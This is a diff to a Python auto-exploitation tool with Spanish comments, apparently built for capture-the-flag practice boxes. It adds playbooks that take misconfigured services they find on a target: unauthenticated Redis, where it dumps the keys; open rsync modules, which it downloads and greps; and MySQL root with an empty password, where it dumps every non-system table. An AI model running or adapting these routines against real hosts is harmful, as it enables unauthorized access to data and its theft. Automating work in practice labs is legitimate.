@@ -188,12 +188,90 @@ def pb_smb(client, target, steps) -> list:
     return list(dict.fromkeys(flags))
 
 
+def pb_redis(client, target, steps) -> list:
+    """Estilo Redeemer: Redis SIN auth -> vuelca todas las claves -> caza flags."""
+    keys_out = _run(client, f"redis-cli -h {target} -t 8 keys '*' 2>&1", timeout=30)
+    if "refused" in keys_out or "Could not connect" in keys_out:
+        _step(steps, "ENUM", "Redis sin auth", "sin acceso", keys_out)
+        return []
+    if "NOAUTH" in keys_out:
+        _step(steps, "ENUM", "Redis sin auth", "requiere contraseña", keys_out)
+        return []
+    keys = [k.strip() for k in keys_out.splitlines()
+            if k.strip() and not k.strip().startswith("(")]
+    dump = ""
+    for k in keys[:50]:
+        v = _run(client, f"redis-cli -h {target} -t 8 get '{k}' 2>&1", timeout=15)
+        dump += f"{k} = {v.strip()}\n"
+    flags = list(dict.fromkeys(FLAG_RE.findall(dump) + FLAG_RE.findall(" ".join(keys))))
+    _step(steps, "LOOT" if flags else "ENUM", "Redis volcar claves (sin auth)",
+          "flag!" if flags else "claves leídas", dump or keys_out,
+          [f"claves={keys}"] + ([f"flag={flags[0]}"] if flags else []))
+    return flags
+
+
+def pb_rsync(client, target, steps) -> list:
+    """Estilo Synced: rsync SIN auth -> lista módulos -> baja y caza flags."""
+    mods_out = _run(client, f"rsync --contimeout=8 rsync://{target}/ 2>&1", timeout=30)
+    mods = [ln.split()[0] for ln in mods_out.splitlines()
+            if ln.strip() and not ln.lower().startswith(("rsync error", "@error", "rsync:"))]
+    if not mods:
+        _step(steps, "ENUM", "rsync listar módulos (sin auth)", "sin acceso", mods_out)
+        return []
+    _step(steps, "ENUM", "rsync listar módulos (sin auth)", "acceso OK", mods_out,
+          [f"módulos={mods}"])
+    flags = []
+    for m in mods:
+        d = "/tmp/lh_rsync_" + re.sub(r"[^A-Za-z0-9]", "_", m)
+        dump = _run(client,
+            f"rm -rf {d}; mkdir -p {d}; "
+            f"rsync -a --contimeout=8 rsync://{target}/'{m}'/ {d}/ 2>&1; "
+            f"echo '---FILES---'; find {d} -type f 2>/dev/null; "
+            f"echo '---GREP---'; grep -rhoE '[a-f0-9]{{32}}' {d} 2>/dev/null", timeout=120)
+        found = FLAG_RE.findall(dump)
+        flags += found
+        _step(steps, "LOOT" if found else "ENUM", f"rsync bajar módulo '{m}'",
+              "flag!" if found else "bajado", dump, [f"flag={found[0]}"] if found else [])
+    return list(dict.fromkeys(flags))
+
+
+def pb_mysql(client, target, steps) -> list:
+    """Estilo Sequel: MySQL/MariaDB root SIN contraseña -> vuelca bases -> caza flags."""
+    base = f"mysql -h {target} -u root --connect-timeout=8 -N"
+    show = _run(client, f"{base} -e 'show databases;' 2>&1", timeout=30)
+    if "Access denied" in show:
+        _step(steps, "ENUM", "MySQL root sin contraseña", "acceso denegado (requiere pass)", show)
+        return []
+    dbs = [d.strip() for d in show.splitlines() if d.strip() and "ERROR" not in d and "mysql:" not in d]
+    if not dbs:
+        _step(steps, "ENUM", "MySQL root sin contraseña", "sin acceso", show)
+        return []
+    SYS = {"information_schema", "mysql", "performance_schema", "sys"}
+    custom = [d for d in dbs if d.lower() not in SYS]
+    _step(steps, "ENUM", "MySQL root sin contraseña", "acceso OK", show,
+          [f"bases={dbs}", f"no-sistema={custom}"])
+    flags, dump = [], ""
+    for db in custom:
+        tbls = _run(client, f"{base} -e 'show tables;' '{db}' 2>&1", timeout=30)
+        for t in [x.strip() for x in tbls.splitlines() if x.strip() and "ERROR" not in x]:
+            rows = _run(client, f"{base} -e 'select * from `{t}`;' '{db}' 2>&1", timeout=30)
+            dump += f"[{db}.{t}]\n{rows}\n"
+            flags += FLAG_RE.findall(rows)
+    flags = list(dict.fromkeys(flags))
+    _step(steps, "LOOT" if flags else "ENUM", "MySQL volcar bases no-sistema",
+          "flag!" if flags else "leído", dump, [f"flag={flags[0]}"] if flags else [])
+    return flags
+
+
 # servicio detectado por nmap -> playbook a ejecutar
 PLAYBOOKS = {
     "telnet": pb_telnet,
     "ftp": pb_ftp,
     "microsoft-ds": pb_smb,   # 445 (Dancing y cualquier caja Windows con SMB)
     "netbios-ssn": pb_smb,    # 139
+    "redis": pb_redis,        # 6379 (Redeemer)
+    "rsync": pb_rsync,        # 873  (Synced)
+    "mysql": pb_mysql,        # 3306 (Sequel)
 }
 
 
